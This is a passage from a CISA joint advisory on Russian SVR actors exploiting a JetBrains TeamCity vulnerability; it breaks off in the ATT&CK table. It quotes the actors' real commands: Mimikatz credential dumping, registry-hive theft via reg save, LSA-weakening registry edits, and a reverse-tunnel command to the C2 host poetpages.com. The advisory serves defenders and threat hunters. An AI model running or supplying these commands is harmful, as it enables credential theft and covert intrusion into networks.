{"markdown": "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n Russian Foreign Intelligence Service (SVR) Exploiting JetBrains TeamCity CVE Globally \\| CISA\n \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n[Skip to main content](#main) \n\n\n\n\n\n\n\n\n\n\n\n\n![U.S. flag](/profiles/cisad8_gov/themes/custom/gesso/dist/images/us_flag_small.png)\n\n\n\n An official website of the United States government\n \n\n\n\n Here\u2019s how you know\n \n\n\n\n\n\n Here\u2019s how you know\n \n\n\n\n\n\n\n![Dot gov](/profiles/cisad8_gov/themes/custom/gesso/dist/images/icon-dot-gov.svg)\n\n\n**Official websites use .gov** \n  \n\n A\n **.gov** \n website belongs to an official government organization in the United States.\n \n\n\n\n\n\n![HTTPS](/profiles/cisad8_gov/themes/custom/gesso/dist/images/icon-https.svg)\n\n\n**Secure .gov websites use HTTPS** \n  \n\n A\n **lock** \n (\n \n\n\n Lock\n \n\n A locked padlock\n \n\n\n\n\n ) or\n **https://** \n means you\u2019ve safely connected to the .gov website. Share sensitive information only on official, secure websites.\n \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n[Free Cyber Services](/resources-tools/resources/free-cybersecurity-services-and-tools \"Free Cyber Services\") \n[\\#protect2024](/protect2024) \n[Secure Our World](/node/18883) \n[Shields Up](/node/8056) \n[Report A Cyber Issue](/node/16591) \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n[![CISA Logo Americas Cyber Defense Agency](/sites/default/files/images/SVG/header_logo_tagline_update.svg)](/)\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n[![CISA Logo](/sites/default/files/images/SVG/mobile_logo_wordmark.svg)](/)\n\n\n\n\n\n\n\n\n\n\n Search\n \n\n\n\n\n\n\n\n\n\n Menu\n \n\n\n\n\n\n\n\n\n\n\n\n\n![America's Cyber Defense Agency](/sites/default/files/images/SVG/header_tagline_mobile_update.svg)\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n Close\n \n\n\n\n\n* Topics\n \n\n\n\n[Topics](/topics) \n\n\n\n\n[Cybersecurity Best Practices](/topics/cybersecurity-best-practices)\n\n\n\n\n[Cyber Threats and Advisories](/topics/cyber-threats-and-advisories)\n\n\n\n\n[Critical Infrastructure Security and Resilience](/topics/critical-infrastructure-security-and-resilience)\n\n\n\n\n[Election Security](/topics/election-security)\n\n\n\n\n[Emergency Communications](/topics/emergency-communications)\n\n\n\n\n[Industrial Control Systems](/topics/industrial-control-systems)\n\n\n\n\n[Information and Communications Technology Supply Chain Security](/topics/information-communications-technology-supply-chain-security)\n\n\n\n\n[Partnerships and Collaboration](/topics/partnerships-and-collaboration)\n\n\n\n\n[Physical Security](/topics/physical-security)\n\n\n\n\n[Risk Management](/topics/risk-management)\n\n\n\n\n\n[How can we help?](/audiences) \n\n\n[Government](/topics/government) \n[Educational Institutions](/topics/educational-institutions) \n[Industry](/topics/industry) \n[State, Local, Tribal, and Territorial](/topics/state-local-tribal-and-territorial) \n[Individuals and Families](/topics/individuals-and-families) \n[Small and Medium Businesses](/topics/small-and-medium-businesses) \n[Find Help Locally](/audiences/find-help-locally) \n[Faith\\-Based Community](/audiences/faith-based-community) \n[Executives](/audiences/executives) \n[High\\-Risk Communities](/audiences/high-risk-communities)\n* [Spotlight](/spotlight)\n* Resources \\& Tools\n \n\n\n\n[Resources \\& Tools](/resources-tools) \n\n\n\n\n[All Resources \\& Tools](/resources-tools/all-resources-tools)\n\n\n\n\n[Services](/resources-tools/services)\n\n\n\n\n[Programs](/resources-tools/programs)\n\n\n\n\n[Resources](/resources-tools/resources)\n\n\n\n\n[Training](/resources-tools/training)\n\n\n\n\n[Groups](/resources-tools/groups)\n* News \\& Events\n \n\n\n\n[News \\& Events](/news-events) \n\n\n\n\n[News](/news-events/news)\n\n\n\n\n[Events](/news-events/events)\n\n\n\n\n[Cybersecurity Alerts \\& Advisories](/news-events/cybersecurity-advisories)\n\n\n\n\n[Directives](/news-events/directives)\n\n\n\n\n[Request a CISA Speaker](/news-events/request-speaker)\n\n\n\n\n[Congressional Testimony](/news-events/congressional-testimony)\n\n\n\n\n[CISA Conferences](/cisa-conferences)\n\n\n\n\n[CISA Live!](/cisa-live)\n* Careers\n \n\n\n\n[Careers](/careers) \n\n\n\n\n[Benefits \\& Perks](/careers/benefits-perks)\n\n\n\n\n[HireVue Applicant Reasonable Accommodations Process](/careers/hirevue-applicant-reasonable-accommodations-process)\n\n\n\n\n[Hiring](/general-recruitment-and-hiring-faqs)\n\n\n\n\n[Resume \\& Application Tips](/careers/resume-application-tips)\n\n\n\n\n[Students \\& Recent Graduates](/students-recent-graduates-employment-opportunities)\n\n\n\n\n[Veteran and Military Spouses](/careers/veteran-and-military-spouse-employment-opportunities)\n\n\n\n\n[Work @ CISA](/careers/work-cisa)\n* About\n \n\n\n\n[About](/about) \n\n\n\n\n[Culture](/about/culture)\n\n\n\n\n[Divisions \\& Offices](/about/divisions-offices)\n\n\n\n\n[Regions](/about/regions)\n\n\n\n\n[Leadership](/about/leadership)\n\n\n\n\n[Doing Business with CISA](/doing-business-cisa)\n\n\n\n\n[Site Links](/site-links)\n\n\n\n\n[Reporting Employee and Contractor Misconduct](/reporting-employee-and-contractor-misconduct)\n\n\n\n\n[CISA GitHub](/cisa-github)\n\n\n\n\n[CISA Central](/cisa-central)\n\n\n\n\n[2023 Year In Review](/about/2023YIR)\n\n\n\n\n[Contact Us](/about/contact-us)\n\n\n\n\n\n\n\n\n\n[Free Cyber Services](/resources-tools/resources/free-cybersecurity-services-and-tools \"Free Cyber Services\") \n[\\#protect2024](/protect2024) \n[Secure Our World](/node/18883) \n[Shields Up](/node/8056) \n[Report A Cyber Issue](/node/16591) \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n Breadcrumb\n \n1. [Home](/)\n2. [News \\& Events](/news-events)\n3. [Cybersecurity Advisories](/news-events/cybersecurity-advisories)\n4. [Cybersecurity Advisory](/news-events/cybersecurity-advisories?f%5B0%5D=advisory_type%3A94)\n\n\n\n\n\n\n\n\n Share:\n \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n Cybersecurity Advisory\n \nRussian Foreign Intelligence Service (SVR) Exploiting JetBrains TeamCity CVE Globally\n=====================================================================================\n\n\n\n\n\n Release Date\n \n\n\n December 13, 2023\n \n\n\n\n\n Alert Code\n \n\n AA23\\-347A\n \n\n\n\n\n Related topics:\n \n\n[Nation\\-State Cyber Actors](/topics/cyber-threats-and-advisories/nation-state-cyber-actors) \n ,\n [Cyber Threats and Advisories](/topics/cyber-threats-and-advisories) \n ,\n [Securing Networks](/topics/cyber-threats-and-advisories/securing-networks) \n\n\n\n\n\n\n\n\n\n\n\n\n\n### **SUMMARY**\n\n\n\n The U.S. Federal Bureau of Investigation (FBI), U.S. Cybersecurity \\& Infrastructure Security Agency (CISA), U.S. National Security Agency (NSA), Polish Military Counterintelligence Service (SKW), CERT Polska (CERT.PL), and the UK\u2019s National Cyber Security Centre (NCSC) assess Russian Foreign Intelligence Service (SVR) cyber actors\u2014also known as Advanced Persistent Threat 29 (APT 29\\), the Dukes, CozyBear, and NOBELIUM/Midnight Blizzard\u2014are exploiting\n [CVE\\-2023\\-42793](https://nvd.nist.gov/vuln/detail/cve-2023-42793 \"CVE-2023-42793\") \n at a large scale, targeting servers hosting JetBrains TeamCity software since September 2023\\.\n \n\n\n\n Software developers use TeamCity software to manage and automate software compilation, building, testing, and releasing. If compromised, access to a TeamCity server would provide malicious actors with access to that software developer\u2019s source code, signing certificates, and the ability to subvert software compilation and deployment processes\u2014access a malicious actor could further use to conduct supply chain operations. Although the SVR used such access to compromise SolarWinds and its customers in 2020, limited number and seemingly opportunistic types of victims currently identified, indicate that the SVR has not used the access afforded by the TeamCity CVE in a similar manner. The SVR has, however, been observed using the initial access gleaned by exploiting the TeamCity CVE to escalate its privileges, move laterally, deploy additional backdoors, and take other steps to ensure persistent and long\\-term access to the compromised network environments.\n \n\n\n\n To bring Russia\u2019s actions to public attention, the authoring agencies are providing information on the SVR\u2019s most recent compromise to aid organizations in conducting their own investigations and securing their networks, provide compromised entities with actionable indicators of compromise (IOCs), and empower private sector cybersecurity companies to better detect and counter the SVR\u2019s malicious actions. The authoring agencies recommend all organizations with affected systems that did not immediately apply available patches or workarounds to assume compromise and initiate threat hunting activities using the IOCs provided in this CSA. If potential compromise is detected, administrators should apply the incident response recommendations included in this CSA and report key findings to the FBI and CISA.\n \n\n\n\n Download the PDF version of this report:\n \n\n\n\n\n[AA23\\-347A Russian Foreign Intelligence Service (SVR) Exploiting JetBrains TeamCity CVE Globally](/sites/default/files/2023-12/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally_0.pdf) \n\n (PDF, 774\\.65 KB\n )\n \n\n\n\n For a downloadable copy of IOCs, see:\n \n\n\n\n\n[AA23\\-347A STIX XML](/sites/default/files/2023-12/AA23-347A.stix__1.xml) \n\n (XML, 76\\.99 KB\n )\n \n\n\n\n\n[AA23\\-347A STIX JSON](/sites/default/files/2023-12/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally.json) \n\n (JSON, 69\\.29 KB\n )\n \n\n\n### **THREAT OVERVIEW**\n\n\n\n SVR cyber operations pose a persistent threat to public and private organizations\u2019 networks globally. Since 2013, cybersecurity companies and governments have reported on SVR operations targeting victim networks to steal confidential and proprietary information. A decade later, the authoring agencies can infer a long\\-term targeting pattern aimed at collecting, and enabling the collection of, foreign intelligence, a broad concept that for Russia encompasses information on the politics, economics, and military of foreign states; science and technology; and foreign counterintelligence. The SVR also conducts cyber operations targeting technology companies that enable future cyber operations.\n \n\n\n\n A decade ago, public reports about SVR cyber activity focused largely on the SVR\u2019s spear phishing operations, targeting government agencies, think tanks and policy analysis organizations, educational institutions, and political organizations. This category of targeting is consistent with the SVR\u2019s responsibility to collect political intelligence, the collection of which has long been the SVR\u2019s highest priority. For the Russian Government, political intelligence includes not only the development and execution of foreign policies, but also the development and execution of domestic policies and the political processes that drive them. In December 2016, the U.S. Government published a Joint Analysis Report titled \u201cGRIZZLY STEPPE \u2013 Russian Malicious Cyber Activity,\u201d which describes the SVR\u2019s compromise of a U.S. political party leading up to a presidential election. The SVR\u2019s use of spear phishing operations are visible today in its ongoing Diplomatic Orbiter campaign, primarily targeting diplomatic agencies. In 2023, SKW and CERT.PL published a Joint Analysis Report describing tools and techniques used by the SVR to target embassies in dozens of countries.\n \n\n\n\n Less frequently, reporting on SVR cyber activity has addressed other aspects of the SVR\u2019s foreign intelligence collection mission. In July 2020, U.S., U.K., and Canadian Governments jointly published an advisory revealing the SVR\u2019s exploitation of CVEs to gain initial access to networks, and its deployment of custom malware known as WellMess, WellMail, and Sorefang to target organizations involved in COVID\\-19 vaccine development.\u00a0Although not listed in the 2020 advisory did not mention it, the authoring agencies can now disclose that the SVR\u2019s WellMess campaign also targeted energy companies. Such biomedical and energy targets are consistent with the SVR\u2019s responsibility to support the Russian economy by pursuing two categories of foreign intelligence known as economic intelligence and science and technology.\n \n\n\n\n In April 2021, the U.S. Government attributed a supply chain operation targeting the SolarWinds information technology company and its customers to the SVR. This attribution marked the discovery that the SVR had, since at least 2018, expanded the range of its cyber operations to include the widespread targeting of information technology companies. At least some of this targeting was aimed at enabling additional cyber operations. Following this attribution, the U.S. and U.K. Governments published advisories highlighting additional SVR TTPs, including its exploitation of various CVEs, the SVR\u2019s use of \u201clow and slow\u201d password spraying techniques to gain initial access to some victims\u2019 networks, exploitation of a zero\\-day exploit, and exploitation of Microsoft 365 cloud environments.\n \n\n\n\n In this newly attributed operation targeting networks hosting TeamCity servers, the SVR demonstrably continues its practice of targeting technology companies. By choosing to exploit CVE\\-2023\\-42793, a software development program, the authoring agencies assess the SVR could benefit from access to victims, particularly by allowing the threat actors to compromise the networks of dozens of software developers. JetBrains issued a patch for this CVE in mid\\-September 2023, limiting the SVR\u2019s operation to the exploitation of unpatched, Internet\\-reachable TeamCity servers. While the authoring agencies assess the SVR has not yet used its accesses to software developers to access customer networks and is likely still in the preparatory phase of its operation, having access to these companies\u2019 networks presents the SVR with opportunities to enable hard\\-to\\- detect command and control (C2\\) infrastructure.\n \n\n\n### **TECHNICAL DETAILS**\n\n\n\n**Note:** \n This advisory uses the\n [MITRE ATT\\&CK\n \u00ae \n for Enterprise](https://attack.mitre.org/versions/v14/matrices/enterprise/ \"Enterprise Matrix\") \n framework, version 14\\. See the MITRE ATT\\&CK Tactics and Techniques section for a table of the threat actors\u2019 activity mapped to MITRE ATT\\&CK\n \u00ae \n tactics and techniques. For assistance with mapping malicious cyber activity to the MITRE ATT\\&CK framework, see CISA and MITRE ATT\\&CK\u2019s\n [Best Practices for MITRE ATT\\&CK Mapping](https://www.cisa.gov/news-events/news/best-practices-mitre-attckr-mapping \"Best Practices for MITRE ATT&CK Mapping\") \n and CISA\u2019s\n [Decider Tool](https://github.com/cisagov/Decider/ \"cisagov / decider\") \n . While SVR followed a similar playbook in each compromise, they also adjusted to each operating environment and not all presented steps or actions below were executed on every host.\n \n\n\n#### ***Initial Access \\- Exploitation***\n\n\n\n The SVR started to exploit Internet\\-connected JetBrains TeamCity servers \\[\n [T1190](https://attack.mitre.org/versions/v14/techniques/T1190/ \"Exploit Public-Facing Application\") \n ] in late September 2023 using CVE\\-2023\\-42793, which enables the insecure handling of specific paths allowing for bypassing authorization, resulting in arbitrary code execution on the server. The authoring agencies' observations show that the TeamCity exploitation usually resulted in code execution \\[\n [T1203](https://attack.mitre.org/versions/v14/techniques/T1203/ \"Exploitation for Client Execution\") \n ] with high privileges\u00a0granting the SVR an advantageous foothold in the network environment. The authoring agencies are not currently aware of any other initial access vector to JetBrains TeamCity currently being exploited by the SVR.\n \n\n\n#### ***Host Reconnaissance***\n\n\n\n Initial observations show the SVR used the following basic, built\\-in commands to perform host reconnaissance \\[\n [T1033](https://attack.mitre.org/versions/v14/techniques/T1033/ \"System Owner/User Discovery\") \n ],\\[\n [T1059\\.003](https://attack.mitre.org/versions/v14/techniques/T1059/003/ \"Command and Scripting Interpreter: Windows Command Shell\") \n ],\\[\n [T1592\\.002](https://attack.mitre.org/versions/v14/techniques/T1592/002/ \"Gather Victim Host Information: Software\") \n ]:\n \n\n\n* whoami /priv\n* whoami /all\n* whoami /groups\n* whoami /domain\n* nltest \\-dclist\n* nltest \\-dsgetdc\n* tasklist\n* netstat\n* wmic /node:\"\"\\<redacted\\>\"\" /user:\"\"\\<redacted\\>\"\" /password:\"\"\\<redacted\\>\"\"\u00a0process list brief\n* wmic /node:\"\"\\<redacted\\>\"\" process list brief\n* wmic process get commandline \\-all\n* wmic process \\<proc\\_id\\> get commandline\n* wmic process where name\\=\"\"GoogleCrashHandler64\\.exe\"\" get commandline,processed\n* powershell (\\[adsisearcher]\"((samaccountname\\=\\<redacted\\>))\").Findall().Properties\n* powershell (\\[adsisearcher]\"((samaccountname\\=\\<redacted\\>))\").Findall().Properties.memberof\n* powershell Get\\-WmiObject \\-Class Win32\\_Service \\-Computername\n* powershell Get\\-WindowsDriver \\-Online \\-All\n\n\n#### ***File Exfiltration***\n\n\n\n Additionally, the authoring agencies have observed the SVR exfiltrating files \\[\n [T1041](https://attack.mitre.org/versions/v14/techniques/T1041/ \"Exfiltration Over C2 Channel\") \n ] which may provide insight into the host system\u2019s operating system:\n \n\n\n* C:\\\\Windows\\\\system32\\\\ntoskrnl.exe\u00a0to precisely identify system version, likely as a prerequisite to deploy EDRSandBlast.\n* SQL Server executable files \\- based on the review of the post exploitation actions, the SVR showed an interest in specific files of the SQL Server installed on the compromised systems:\n\t+ C:\\\\Program Files\\\\Microsoft SQL Server\\\\MSSQL14\\.MSSQLSERVER\\\\MSSQL\\\\Binn\\\\sqlmin.dll,\n\t+ C:\\\\Program Files\\\\Microsoft SQL Server\\\\MSSQL14\\.MSSQLSERVER\\\\MSSQL\\\\Binn\\\\sqllos.dll,\n\t+ C:\\\\Program Files\\\\Microsoft SQL Server\\\\MSSQL14\\.MSSQLSERVER\\\\MSSQL\\\\Binn\\\\sqllang.dll,\n\t+ C:\\\\Program Files\\\\Microsoft SQL Server\\\\MSSQL14\\.MSSQLSERVER\\\\MSSQL\\\\Binn\\\\sqltses.dll\n\t+ C:\\\\Program Files\\\\Microsoft SQL Server\\\\MSSQL14\\.MSSQLSERVER\\\\MSSQL\\\\Binn\\\\secforwarder.dll\n* Visual Studio files \u2013 based on the review of the post exploitation actions, the SVR showed an interest in specific files of the Visual Studio:\n\t+ C:\\\\Program Files (x86\\)\\\\Microsoft Visual Studio\\\\2017\\\\SQL\\\\Common7\\\\IDE\\\\VSIXAutoUpdate.exe\n\t+ Update management agent files \u2013 based on the review of the post exploitation actions, the SVR showed an interest in executables and configuration of patch management software:\n\t\t- C:\\\\Program Files (x86\\)\\\\PatchManagementInstallation\\\\Agent\\\\12\\\\Httpd\\\\bin\\\\httpd.exe\n\t\t- C:\\\\Program Files (x86\\)\\\\PatchManagementInstallation\\\\Agent\\\\12\\\\Httpd\n\t\t- C:\\\\ProgramData\\\\GFI\\\\LanGuard 12\\\\HttpdConfig\\\\httpd.conf\n\n\n#### ***Interest in SQL Server***\n\n\n\n Based on the review of the exploitation, the SVR also showed an interest in details of the SQL Server \\[\n [T1059\\.001](https://attack.mitre.org/versions/v14/techniques/T1059/001/ \"Command and Scripting Interpreter: PowerShell\") \n ],\\[\n [T1505\\.001](https://attack.mitre.org/versions/v14/techniques/T1505/001/ \"Server Software Component: SQL Stored Procedures\") \n ]:\n \n\n\n* powershell Compress\\-Archive \\-Path \"C:\\\\Program Files\\\\Microsoft SQL Server\\\\MSSQL14\\.MSSQLSERVER\\\\MSSQL\\\\Binn\\\\sqlmin.dll\",\"C:\\\\Program Files\\\\Microsoft SQL Server\\\\MSSQL14\\.MSSQLSERVER\\\\MSSQL\\\\Binn\\\\sqllos.dll\",\"C:\\\\Program Files\\\\Microsoft SQL Server\\\\MSSQL14\\.MSSQLSERVER\\\\MSSQL\\\\Binn\\\\sqllang.dll\",\"C:\\\\Program Files\\\\Microsoft SQL Server\\\\MSSQL14\\.MSSQLSERVER\\\\MSSQL\\\\Binn\\\\sqltses.dll\" \\-DestinationPath C:\\\\Windows\\\\temp\\\\1\\\\sql.zip\n* SVR cyber actors also exfiltrated secforwarder.dll\n\n\n#### ***Tactics Used to Avoid Detection***\n\n\n\n To avoid detection, the SVR used a \u201cBring Your Own Vulnerable Driver\u201d \\[\n [T1068](https://attack.mitre.org/versions/v14/techniques/T1068/) \n ] technique to disable or outright kill endpoint detection and response (EDR) and antivirus (AV) software \\[\n [T1562\\.001](https://attack.mitre.org/versions/v14/techniques/T1562/001/ \"Impair Defenses: Disable or Modify Tools\") \n ].\n \n\n\n\n This was done using an open source project called \u201cEDRSandBlast.\u201d\u00a0The authoring agencies have observed the SVR using EDRSandBlast to remove protected process light (PPL) protection, which is used for controlling and protecting running processes and protecting them from infection. The actors then inject code into AV/EDR processes for a small subset of victims \\[\n [T1068](https://attack.mitre.org/versions/v14/techniques/T1068/) \n ]. Additionally, executables that are likely to be detected (i.e. Mimikatz) were executed in memory \\[\n [T1003\\.001](https://attack.mitre.org/versions/v14/techniques/T1003/001/) \n ].\n \n\n\n\n In several cases SVR attempted to hide their backdoors via:\n \n\n\n* Abusing a DLL hijacking vulnerability in Zabbix\u00a0software by replacing a legitimate Zabbix DLL with their one containing GraphicalProton backdoor,\n* Backdooring an open source application developed by Microsoft named vcperf. SVR modified and copied publicly available sourcecode. After execution, backdoored vcperf dropped several DLLs to disc, one of those being a GraphicalProton backdoor,\n* Abusing a DLL hijacking vulnerability in Webroot\u00a0antivirus software by replacing a legitimate DLL with one containing GraphicalProton backdoor.\n\n\n\n To avoid detection by network monitoring, the SVR devised a covert C2 channel that used Microsoft OneDrive and Dropbox cloud services. To further enable obfuscation, data exchanged with malware via OneDrive and Dropbox were hidden inside randomly generated BMP files \\[\n [T1564](https://attack.mitre.org/versions/v14/techniques/T1564/ \"Hide Artifacts\") \n ], illustrated below:\n \n\n\n\n\n![Picture 1 - Randomly Generated BMP Files](/sites/default/files/styles/large/public/2023-12/Picture%201%20-%20Randomly%20Generated%20BMP%20Files.png?itok=DaN0PY_Y)\n\n\n#### ***Privilege Escalation***\n\n\n\n To facilitate privilege escalation \\[\n [T1098](//attack.mitre.org/versions/v14/techniques/T1098/) \n ], the SVR used multiple techniques, including WinPEAS,\u00a0NoLMHash registry key modification, and the Mimikatz tool.\n \n\n\n\n The SVR modified the NoLMHash registry using the following reg command:\n \n\n\n* reg add HKEY\\_LOCAL\\_MACHINE\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\Lsa /v NoLMHash /t REG\\_DWORD /d \"0\" /f\n\n\n\n The SVR used the following Mimikatz commands \\[\n [T1003](https://attack.mitre.org/versions/v14/techniques/T1003/ \"OS Credential Dumping\") \n ]:\n \n\n\n* privilege::debug\n* lsadump::cache\n* lsadump::secrets\n* lsadump::sam\n* sekurlsa::logonpasswords\n\n\n#### ***Persistence***\n\n\n\n The SVR relied on scheduled tasks \\[\n [T1053\\.005](https://attack.mitre.org/versions/v14/techniques/T1053/005/ \"Scheduled Task/Job: Scheduled Task\") \n ] to secure persistent execution of backdoors. Depending on the privileges the SVR had, their executables were stored in one of following directories:\n \n\n\n* C:\\\\Windows\\\\temp\n* C:\\\\Windows\\\\System32\n* C:\\\\Windows\\\\WinStore\n\n\n\n The SVR made all modifications using the schtasks.exe binary. It then had multiple variants of arguments passed to schtasks.exe, which can be found in\n **Appendix B \u2013 Indicators of Compromise** \n .\n \n\n\n\n To secure long\\-term access to the environment, the SVR used the Rubeus\u00a0toolkit to craft Ticket Granting Tickets (TGTs) \\[\n [T1558\\.001](https://attack.mitre.org/versions/v14/techniques/T1558/001/ \"Steal or Forge Kerberos Tickets: Golden Ticket\") \n ].\n \n\n\n#### ***Sensitive Data Exfiltration \\[***\n[***T1020***](https://attack.mitre.org/versions/v14/techniques/T1020/ \"Automated Exfiltration\")\n***]***\n\n\n\n The SVR exfiltrated the following Windows Registry hives from its victims \\[\n [T1003](https://attack.mitre.org/versions/v14/techniques/T1003/001/ \"OS Credential Dumping: LSASS Memory\") \n ]:\n \n\n\n* HKLM\\\\SYSTEM\n* HKLM\\\\SAM\n* HKLM\\\\SECURITY\n\n\n\n In order to exfiltrate Windows Registry, the SVR saved hives into files \\[\n [T1003\\.002](https://attack.mitre.org/versions/v14/techniques/T1003/002/ \"OS Credential Dumping: Security Account Manager\") \n ], packed them, and then exfiltrated them using a backdoor capability. it used \u201creg save\u201d to save SYSTEM, SAM and SECURITY registry hives, and used powershell to stage .zip archives in the C:\\\\Windows\\\\Temp\\\\ directory.\n \n\n\n* reg save HKLM\\\\SYSTEM \"\"C:\\\\Windows\\\\temp\\\\1\\\\sy.sa\"\" /y\n* reg save HKLM\\\\SAM \"\"C:\\\\Windows\\\\temp\\\\1\\\\sam.sa\"\" /y\n* reg save HKLM\\\\SECURITY \"\"C:\\\\Windows\\\\temp\\\\1\\\\se.sa\"\" /y\n* powershell Compress\\-Archive \\-Path C:\\\\Windows\\\\temp\\\\1\\\\ \\-DestinationPath C:\\\\Windows\\\\temp\\\\s.zip \\-Force \\& del C:\\\\Windows\\\\temp\\\\1 /F /Q\n\n\n\n In a few specific cases, the SVR used the SharpChromium\u00a0tool to obtain sensitive browser data such as session cookies, browsing history, or saved logins.\n \n\n\n\n SVR also used DSInternals open source tool to interact with Directory Services. DSInternals\u00a0allows to obtain a sensitive Domain information.\n \n\n\n#### ***Network Reconnaissance***\n\n\n\n After the SVR built a secure foothold and gained an awareness of a victim\u2019s TeamCity server, it then focused on network reconnaissance \\[\n [T1590\\.004](https://attack.mitre.org/versions/v14/techniques/T1590/004/ \"Gather Victim Network Information: Network Topology\") \n ]. The SVR performed network reconnaissance using a mix of built\\-in commands and additional tools, such as port scanner and PowerSploit, which it launched into memory \\[\n [T1046](https://attack.mitre.org/versions/v14/techniques/T1046/) \n ]. The SVR executed the following PowerSploit commands:\n \n\n\n* Get\\-NetComputer\n* Get\\-NetGroup\n* Get\\-NetUser \\-UACFilter NOT\\_ACCOUNTDISABLE \\| select samaccountname, description, pwdlastset, logoncount, badpwdcount\"\n* Get\\-NetDiDomain\n* Get\\-AdUser\n* Get\\-DomainUser \\-UserName\n* Get\\-NetUser \\-PreauthNotRequire\n* Get\\-NetComputer \\| select samaccountname\n* Get\\-NetUser \\-SPN \\| select serviceprincipalname\n\n\n#### ***Tunneling into Compromised Environments***\n\n\n\n In selected environments the SVR used an additional tool named, \u201crr.exe\u201d\u2014a modified open source reverse socks tunneler named Rsockstun\u2014to establish a tunnel to the C2 infrastructure \\[\n [T1572](https://attack.mitre.org/versions/v14/techniques/T1572/ \"Protocol Tunneling\") \n ].\n \n\n\n\n The authoring agencies are aware of the following infrastructure used in conjunction with \u201crr.exe\u201d:\n \n\n\n* 65\\.20\\.97\\[.]203:443\n* Poetpages\\[.]com:8443\n\n\n\n The SVR executed Rsockstun either in memory or using the Windows Management Instrumentation Command Line (WMIC) \\[\n [T1047](https://attack.mitre.org/versions/v14/techniques/T1047/ \"Windows Management Instrumentation\") \n ] utility after dropping it to disk:\n \n\n\n* wmic process call create \"C:\\\\Program Files\\\\Windows Defender Advanced Threat Protection\\\\Sense.exe \\-connect poetpages.com \\-pass M554\\-0sddsf2@34232fsl45t31\"\n\n\n#### ***Lateral Movement***\n\n\n\n The SVR used WMIC to facilitate lateral movement \\[\n [T1047](https://attack.mitre.org/versions/v14/techniques/T1047/ \"Windows Management Instrumentation\") \n ],\\[\n [T1210](https://attack.mitre.org/versions/v14/techniques/T1210/ \"Exploitation of Remote Services\") \n ].\n \n\n\n* wmic /node:\"\"\\<redacted\\>\"\" /user:\"\"\\<redacted\\>\" /password:\"\"\\<redacted\\>\"\" process call create \"\"rundll32 C:\\\\Windows\\\\system32\\\\AclNumsInvertHost.dll AclNumsInvertHost\"\"\n\n\n\n The SVR also modified DisableRestrictedAdmin key to enable remote connections \\[\n [T1210](https://attack.mitre.org/versions/v14/techniques/T1210/) \n ].\n \n\n\n\n It modified Registry using the following reg command:\n \n\n\n* reg add HKEY\\_LOCAL\\_MACHINE\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\Lsa /v DisableRestrictedAdmin /t REG\\_DWORD /d \"0\" /f\n\n\n#### ***Adversary Toolset***\n\n\n\n In the course of the TeamCity operation, the SVR used multiple custom and open source available tools and backdoors. The following custom tools were observed in use during the operation:\n \n\n\n* **GraphicalProton** \n is a simplistic backdoor that uses OneDrive, Dropbox, and randomly generated BMPs \\[\n [T1027\\.001](https://attack.mitre.org/versions/v14/techniques/T1027/001/ \"Obfuscated Files or Information: Binary Padding\") \n ] to exchange data with the SVR operator.\n* After execution, GraphicalProton gathers environment information such as active TCP/UDP connections \\[\n [T1049](https://attack.mitre.org/versions/v14/techniques/T1049/ \"System Network Connections Discovery\") \n ], running processes \\[\n [T1049](https://attack.mitre.org/versions/v14/techniques/T1049/ \"System Network Connections Discovery\") \n ], as well as user, host, and domain names \\[\n [T1590](https://attack.mitre.org/versions/v14/techniques/T1590/ \"Gather Victim Network Information\") \n ]. OneDrive is used as a primary communication channel while Dropbox is treated as a backup channel \\[\n [T1567](https://attack.mitre.org/versions/v14/techniques/T1567/ \"Exfiltration Over Web Service\") \n ]. API keys are hardcoded into the malware. When communicating with cloud services, GraphicalProton\u00a0generates a randomly named directory which is used to store infection\\-specific BMP files \\- with both commands and results \\[\n [T1564\\.001](https://attack.mitre.org/versions/v14/techniques/T1564/001/ \"Hide Artifacts: Hidden Files and Directories\") \n ]. Directory name is re\\-randomized each time the GraphicalProton process is started.\n* BMP files that were used to exchange data were generated in the following way:\n\n\n1. Compress data using zlib,\n2. Encrypt data using custom algorithm,\n3. Add \u201c\\*\\*\\*\u201d string literal to encrypted data,\n4. Create a random BMP with random rectangle,\n5. And finally, encode encrypted data within lower pixel bits.\n\n\n\n While the GraphicalProton backdoor has remained mostly unchanged over the months we have been tracking it, to avoid detection the adversary wrapped the tool in various different layers of obfuscation, encryption, encoders, and stagers. Two specific variants of GraphicalProton \u201cpackaging\u201d are especially noteworthy \u2013 a variant that uses DLL hijacking \\[\n [T1574\\.002](https://attack.mitre.org/versions/v14/techniques/T1574/002/ \"Hijack Execution Flow: DLL Side-Loading\") \n ] in Zabbix as a means to start execution (and potentially provide long\\-term, hard\\-to\\-detect access) and a variant that masks itself within vcperf \\[\n [T1036](https://attack.mitre.org/versions/v14/techniques/T1036/ \"Masquerading\") \n ], an open\\-source C\\+\\+ build analysis tool from Microsoft.\n \n\n\n* **GraphicalProton HTTPS variant** \n \u2013 a variant of GraphicalProton backdoor recently introduced by the SVR that forgoes using cloud\\-based services as a C2 channel and instead relies on HTTP request.\n   \n\n To legitimize the C2 channel, SVR used a re\\-registered expired domain set up with dummy WordPress website. Execution of HTTPS variant of GraphicalProton is split into two files \u2013 stager and encrypted binary file that contains further code.\n\n\n\n### **MITRE ATT\\&CK TACTICS AND TECHNIQUES**\n\n\n\n See below tables for all referenced threat actor tactics and techniques in this advisory. For additional mitigations, see the Mitigations section.\n \n\n\n\n\n\n*Table 1: SVR Cyber Actors ATT\\&CK Techniques for Enterprise \\- Reconnaissance* \n\n| **Technique Title** | **ID** | **Use** |\n| --- | --- | --- |\n| Gather Victim Network Information: Network Topology | [T1590\\.004](https://attack.mitre.org/versions/v14/techniques/T1590/004/ \"Gather Victim Network Information: Network Topology\") | SVR cyber actors may gather information about the victim\u2019s network 